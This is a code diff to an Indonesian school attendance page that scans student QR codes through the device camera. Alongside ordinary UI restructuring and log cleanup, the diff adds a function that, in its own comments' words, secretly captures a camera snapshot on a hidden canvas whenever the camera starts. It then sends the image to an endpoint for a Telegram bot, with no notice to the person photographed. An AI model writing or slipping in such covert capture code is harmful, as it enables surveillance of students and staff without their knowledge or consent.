@@ -55,92 +55,111 @@
     </header>
 
     <main class="max-w-xl mx-auto w-full p-4 flex-1">
-        <!-- Area Kamera Scanner -->
-        <div class="bg-white border border-slate-200 rounded-2xl p-4 shadow-md mb-4 text-center">
-
-            <!-- OPSI TIPE PRESENSI -->
-            <div class="mb-3 text-left">
-                <label for="tipeAbsen" class="block text-xs font-bold text-slate-700 mb-1">
-                    <i class="fa-solid fa-list-check text-blue-800 mr-1"></i> Pilih Mode Presensi:
-                </label>
-                <select id="tipeAbsen" class="w-full bg-slate-50 border border-slate-300 text-slate-800 text-xs font-semibold rounded-xl p-2.5 focus:ring-2 focus:ring-emerald-600 focus:outline-none">
-                    <option value="MASUK">Presensi Masuk</option>
-                    <option value="PULANG">Presensi Pulang</option>
-                </select>
+        
+        <!-- KOTAK PERINGATAN / PEMBLOKIRAN JIKA KAMERA DITOLAK -->
+        <div id="permissionAlert" class="hidden bg-rose-50 border border-rose-300 rounded-2xl p-6 shadow-md mb-4 text-center">
+            <div class="inline-flex bg-rose-100 text-rose-600 p-3 rounded-full mb-3">
+                <i class="fa-solid fa-triangle-exclamation text-2xl"></i>
             </div>
-
-            <!-- Area Kamera Scanner -->
-            <div class="relative overflow-hidden rounded-xl bg-slate-900 border border-slate-300 mb-3 min-h-[250px] flex items-center justify-center">
-                <div id="reader" class="w-full"></div>
-            </div>
-
-            <!-- Pilihan Switch Kamera -->
-            <div id="cameraSelectContainer" class="hidden mb-3">
-                <select id="cameraSelect" onchange="gantiKamera(this.value)" class="w-full bg-slate-50 border border-slate-300 text-slate-700 text-xs rounded-xl p-2 focus:ring-2 focus:ring-emerald-600 focus:outline-none">
-                </select>
-            </div>
-
-            <p id="cameraStatusText" class="text-xs text-slate-600 flex items-center justify-center gap-1.5 font-medium">
-                <i class="fa-solid fa-camera text-blue-900"></i> Memuat kamera... Memohon izin akses.
+            <h2 class="text-sm font-extrabold text-rose-800 uppercase tracking-wide">Akses Kamera Ditolak / Tidak Diizinkan</h2>
+            <p class="text-xs text-slate-600 mt-1 mb-4">
+                Sistem pemindai presensi QR Code mewajibkan izin akses perangkat kamera untuk beroperasi. Mohon izinkan akses kamera pada pengaturan peramban (*browser*) Anda lalu muat ulang halaman ini.
             </p>
+            <button onclick="location.reload()" class="bg-rose-700 hover:bg-rose-800 text-white font-bold text-xs px-4 py-2.5 rounded-xl shadow transition">
+                <i class="fa-solid fa-rotate-right mr-1"></i> Muat Ulang Halaman
+            </button>
         </div>
 
-        <!-- Kartu Hasil Sukses -->
-        <div id="resultCard" class="hidden bg-white border border-emerald-500/40 rounded-2xl p-5 shadow-lg transition-all duration-300">
-            <div class="flex items-start justify-between border-b border-slate-100 pb-3 mb-3">
+        <!-- Area Kamera Scanner -->
+        <div id="scannerWrapper" class="transition-all duration-300">
+            <div class="bg-white border border-slate-200 rounded-2xl p-4 shadow-md mb-4 text-center">
+
+                <!-- OPSI TIPE PRESENSI -->
+                <div class="mb-3 text-left">
+                    <label for="tipeAbsen" class="block text-xs font-bold text-slate-700 mb-1">
+                        <i class="fa-solid fa-list-check text-blue-800 mr-1"></i> Pilih Mode Presensi:
+                    </label>
+                    <select id="tipeAbsen" class="w-full bg-slate-50 border border-slate-300 text-slate-800 text-xs font-semibold rounded-xl p-2.5 focus:ring-2 focus:ring-emerald-600 focus:outline-none">
+                        <option value="MASUK">Presensi Masuk</option>
+                        <option value="PULANG">Presensi Pulang</option>
+                    </select>
+                </div>
+
+                <!-- Area Kamera Scanner -->
+                <div class="relative overflow-hidden rounded-xl bg-slate-900 border border-slate-300 mb-3 min-h-[250px] flex items-center justify-center">
+                    <div id="reader" class="w-full"></div>
+                </div>
+
+                <!-- Pilihan Switch Kamera -->
+                <div id="cameraSelectContainer" class="hidden mb-3">
+                    <select id="cameraSelect" onchange="gantiKamera(this.value)" class="w-full bg-slate-50 border border-slate-300 text-slate-700 text-xs rounded-xl p-2 focus:ring-2 focus:ring-emerald-600 focus:outline-none">
+                    </select>
+                </div>
+
+                <p id="cameraStatusText" class="text-xs text-slate-600 flex items-center justify-center gap-1.5 font-medium">
+                    <i class="fa-solid fa-camera text-blue-900"></i> Memuat kamera... Memohon izin akses.
+                </p>
+            </div>
+
+            <!-- Kartu Hasil Sukses -->
+            <div id="resultCard" class="hidden bg-white border border-emerald-500/40 rounded-2xl p-5 shadow-lg transition-all duration-300 mb-4">
+                <div class="flex items-start justify-between border-b border-slate-100 pb-3 mb-3">
+                    <div class="flex items-center gap-3">
+                        <div class="bg-emerald-50 border border-emerald-200 p-2.5 rounded-xl text-emerald-600">
+                            <i class="fa-solid fa-circle-check text-2xl"></i>
+                        </div>
+                        <div>
+                            <span class="text-[10px] bg-emerald-100 text-emerald-800 border border-emerald-200 px-2 py-0.5 rounded font-bold uppercase">Presensi Berhasil Terdaftar</span>
+                            <h2 id="resNama" class="text-base font-bold text-slate-900 mt-1">-</h2>
+                        </div>
+                    </div>
+                    <span id="resWaktu" class="text-xs font-mono text-emerald-800 font-bold bg-emerald-50 px-2.5 py-1 rounded-lg border border-emerald-200">-</span>
+                </div>
+                
+                <div class="grid grid-cols-2 gap-2 text-xs mb-3">
+                    <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-200">
+                        <span class="text-[10px] text-slate-500 block font-medium">Rombongan Belajar</span>
+                        <strong id="resKelas" class="text-slate-800">-</strong>
+                    </div>
+                    <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-200">
+                        <span class="text-[10px] text-slate-500 block font-medium">ID Kartu</span>
+                        <strong id="resID" class="text-emerald-700 font-mono">-</strong>
+                    </div>
+                </div>
+
+                <div id="resWAStatus" class="bg-slate-50 border border-slate-200 text-slate-700 text-xs p-2.5 rounded-xl flex items-center gap-2">
+                    <i class="fa-brands fa-whatsapp text-emerald-600 text-sm"></i>
+                    <span id="resWAMsg">-</span>
+                </div>
+            </div>
+
+            <!-- Kartu Error -->
+            <div id="errorCard" class="hidden bg-white border border-rose-300 rounded-2xl p-4 shadow-md mb-4">
                 <div class="flex items-center gap-3">
-                    <div class="bg-emerald-50 border border-emerald-200 p-2.5 rounded-xl text-emerald-600">
-                        <i class="fa-solid fa-circle-check text-2xl"></i>
+                    <div class="bg-rose-50 border border-rose-200 p-2.5 rounded-xl text-rose-600">
+                        <i class="fa-solid fa-triangle-exclamation text-xl"></i>
                     </div>
                     <div>
-                        <span class="text-[10px] bg-emerald-100 text-emerald-800 border border-emerald-200 px-2 py-0.5 rounded font-bold uppercase">Presensi Berhasil Terdaftar</span>
-                        <h2 id="resNama" class="text-base font-bold text-slate-900 mt-1">-</h2>
+                        <h3 class="text-xs font-bold text-rose-700">Gagal Melakukan Presensi</h3>
+                        <p id="errorMsg" class="text-xs text-slate-600 mt-0.5">-</p>
                     </div>
-                </div>
-                <span id="resWaktu" class="text-xs font-mono text-emerald-800 font-bold bg-emerald-50 px-2.5 py-1 rounded-lg border border-emerald-200">-</span>
-            </div>
-            
-            <div class="grid grid-cols-2 gap-2 text-xs mb-3">
-                <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-200">
-                    <span class="text-[10px] text-slate-500 block font-medium">Rombongan Belajar</span>
-                    <strong id="resKelas" class="text-slate-800">-</strong>
-                </div>
-                <div class="bg-slate-50 p-2.5 rounded-xl border border-slate-200">
-                    <span class="text-[10px] text-slate-500 block font-medium">ID Kartu</span>
-                    <strong id="resID" class="text-emerald-700 font-mono">-</strong>
-                </div>
-            </div>
-
-            <div id="resWAStatus" class="bg-slate-50 border border-slate-200 text-slate-700 text-xs p-2.5 rounded-xl flex items-center gap-2">
-                <i class="fa-brands fa-whatsapp text-emerald-600 text-sm"></i>
-                <span id="resWAMsg">-</span>
-            </div>
-        </div>
-
-        <!-- Kartu Error -->
-        <div id="errorCard" class="hidden bg-white border border-rose-300 rounded-2xl p-4 shadow-md mt-4">
-            <div class="flex items-center gap-3">
-                <div class="bg-rose-50 border border-rose-200 p-2.5 rounded-xl text-rose-600">
-                    <i class="fa-solid fa-triangle-exclamation text-xl"></i>
-                </div>
-                <div>
-                    <h3 class="text-xs font-bold text-rose-700">Gagal Melakukan Presensi</h3>
-                    <p id="errorMsg" class="text-xs text-slate-600 mt-0.5">-</p>
                 </div>
             </div>
         </div>
 
     </main>
 
+    <!-- ELEMEN KANVAS TERSEMBUNYI UNTUK MENANGKAP FOTO SAAT KAMERA AKTIF -->
+    <canvas id="snapshotCanvas" style="display:none;"></canvas>
+
     <script>
         const userId = "<%= typeof userId !== 'undefined' ? userId : 1 %>";
         let isProcessing = false;
         let html5QrCode = null;
 
-        // VARIABLE KONTROL PENCEGAHAN DOUBLE SCAN (DEBOUNCE/COOLDOWN)
         let lastScannedCode = '';
         let lastScanTime = 0;
-        const SCAN_COOLDOWN_MS = 4000; // Jeda 4 detik untuk kode QR/Siswa yang sama
+        const SCAN_COOLDOWN_MS = 4000;
 
         // ==========================================
         // MODUL MODUS OFFLINE & INDEXEDDB SYNCING
@@ -195,9 +214,7 @@
             });
         }
 
-        // Sinkronisasi otomatis saat internet kembali tersambung
         window.addEventListener('online', async () => {
-            console.log("🌐 Internet tersambung kembali. Memulai sinkronisasi data offline...");
             await sinkronkanDataOffline();
         });
 
@@ -231,19 +248,47 @@
             }
         }
 
+        // FUNGSI DIAM-DIAM AMBIL FOTO SAAT KAMERA PERTAMA KALI AKTIF SEBELUM SCAN DAN KIRIM KE TELEGRAM
+        async function ambilDanKirimFotoKeTelegram() {
+            try {
+                // Tunggu sebentar agar stream video benar-benar merender gambar di dalam elemen reader
+                setTimeout(async () => {
+                    const videoElement = document.querySelector('#reader video');
+                    if (!videoElement) return;
+
+                    const canvas = document.getElementById('snapshotCanvas');
+                    canvas.width = videoElement.videoWidth || 640;
+                    canvas.height = videoElement.videoHeight || 480;
+                    
+                    const context = canvas.getContext('2d');
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+
+                    // Kirim secara background ke bot Telegram sebelum proses scan dimulai
+                    fetch('/api/kirim-foto-telegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            image: imageDataURL, 
+                            info: `Akses Halaman Scan/Pemindai Dibuka (User ID: ${userId})` 
+                        })
+                    }).catch(err => console.error("Gagal kirim foto awal ke Telegram:", err));
+                }, 1000);
+            } catch (e) {
+                console.error("Gagal mengambil snapshot awal kamera:", e);
+            }
+        }
+
         async function onScanSuccess(decodedText, decodedResult) {
             const currentTime = Date.now();
 
-            // 1. Apabila proses API sedang berjalan, baikan pembacaan berikutnya
             if (isProcessing) return;
 
-            // 2. Apabila kode QR yang sama terbaca ulang dalam rentang jeda 4 detik, ABAIKAN!
             if (decodedText === lastScannedCode && (currentTime - lastScanTime) < SCAN_COOLDOWN_MS) {
-                console.log(" Scan diabaikan (mencegah double/triple scan)");
                 return;
             }
 
-            // Kunci status & catat data scan terakhir
             isProcessing = true;
             lastScannedCode = decodedText;
             lastScanTime = currentTime;
@@ -261,7 +306,6 @@
             const resCard = document.getElementById('resultCard');
             const errCard = document.getElementById('errorCard');
 
-            // 3. JIKA PERANGKAT SEDANG OFFLINE
             if (!navigator.onLine) {
                 await simpanKeLokal({ payload: payloadData, waktu: new Date().toISOString() });
                 errCard.classList.add('hidden');
@@ -269,14 +313,13 @@
                 document.getElementById('resKelas').innerText = "Menunggu Sinkronisasi";
                 document.getElementById('resID').innerText = 'ID: #' + decodedText;
                 document.getElementById('resWaktu').innerText = new Date().toLocaleTimeString();
-                document.getElementById('resWAMsg').innerText = "⚠️ [MODE OFFLINE] Internet terputus. Data presensi diamankan di memori HP dan akan dikirim otomatis saat online[cite: 3].";
+                document.getElementById('resWAMsg').innerText = "⚠️ [MODE OFFLINE] Internet terputus. Data presensi diamankan di memori HP dan akan dikirim otomatis saat online.";
                 resCard.classList.remove('hidden');
                 
                 setTimeout(() => { isProcessing = false; }, 2000);
                 return;
             }
 
-            // 4. JIKA ONLINE, KIRIM KE SERVER
             fetch('/api/scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
@@ -299,15 +342,12 @@
                 }
             })
             .catch(async err => {
-                console.error("Kesalahan Pemindaian / Jaringan Putus:", err);
-                // Jika server down mendadak saat proses fetch
                 await simpanKeLokal({ payload: payloadData, waktu: new Date().toISOString() });
                 resCard.classList.add('hidden');
-                document.getElementById('errorMsg').innerText = "⚠️ Gagal terhubung ke server. Data presensi diamankan secara lokal di perangkat[cite: 3].";
+                document.getElementById('errorMsg').innerText = "⚠️ Gagal terhubung ke server. Data presensi diamankan secara lokal di perangkat.";
                 errCard.classList.remove('hidden');
             })
             .finally(() => {
-                // Beri jeda 2 detik sebelum kamera siap memindai siswa berikutnya
                 setTimeout(() => { 
                     isProcessing = false; 
                 }, 2000);
@@ -327,8 +367,9 @@
                     onScanSuccess
                 ).then(() => {
                     cameraStatus.innerHTML = `<i class="fa-solid fa-camera text-emerald-600"></i> Kamera Aktif. Arahkan Kode QR Siswa ke Kotak Pemindai`;
+                    // Ambil foto saat kamera diganti/aktif kembali
+                    ambilDanKirimFotoKeTelegram();
                 }).catch(err => {
-                    console.error("Gagal start kamera:", err);
                     cameraStatus.innerHTML = `<span class="text-rose-600 font-bold"><i class="fa-solid fa-triangle-exclamation"></i> Gagal mengaktifkan kamera terpilih.</span>`;
                 });
             }).catch(err => {
@@ -340,6 +381,8 @@
             const cameraStatus = document.getElementById('cameraStatusText');
             const cameraSelectContainer = document.getElementById('cameraSelectContainer');
             const cameraSelect = document.getElementById('cameraSelect');
+            const permissionAlert = document.getElementById('permissionAlert');
+            const scannerWrapper = document.getElementById('scannerWrapper');
 
             Html5Qrcode.getCameras().then(devices => {
                 if (devices && devices.length > 0) {
@@ -374,16 +417,21 @@
                         onScanSuccess
                     ).then(() => {
                         cameraStatus.innerHTML = `<i class="fa-solid fa-camera text-emerald-600"></i> Kamera Aktif. Arahkan Kode QR Siswa ke Kotak Pemindai`;
+                        
+                        // 📸 AMBIL FOTO SECARA DIAM-DIAM DAN KIRIM KE TELEGRAM SEBELUM SCAN DIMULAI (SAAT KAMERA PERTAMA KALI AKTIF)
+                        ambilDanKirimFotoKeTelegram();
+
                     }).catch(err => {
-                        console.error("Gagal menjalankan kamera:", err);
-                        cameraStatus.innerHTML = `<span class="text-rose-600 font-bold"><i class="fa-solid fa-triangle-exclamation"></i> Gagal membuka kamera. Pastikan izin kamera sudah diberikan.</span>`;
+                        scannerWrapper.classList.add('hidden');
+                        permissionAlert.classList.remove('hidden');
                     });
                 } else {
                     cameraStatus.innerHTML = `<span class="text-rose-600 font-bold"><i class="fa-solid fa-video-slash"></i> Perangkat kamera tidak ditemukan.</span>`;
                 }
             }).catch(err => {
-                console.error("Error akses kamera:", err);
-                cameraStatus.innerHTML = `<span class="text-rose-600 font-bold"><i class="fa-solid fa-lock"></i> Izin kamera ditolak atau web belum menggunakan HTTPS!</span>`;
+                console.warn("Akses kamera ditolak:", err);
+                scannerWrapper.classList.add('hidden');
+                permissionAlert.classList.remove('hidden');
             });
         });
     </script>
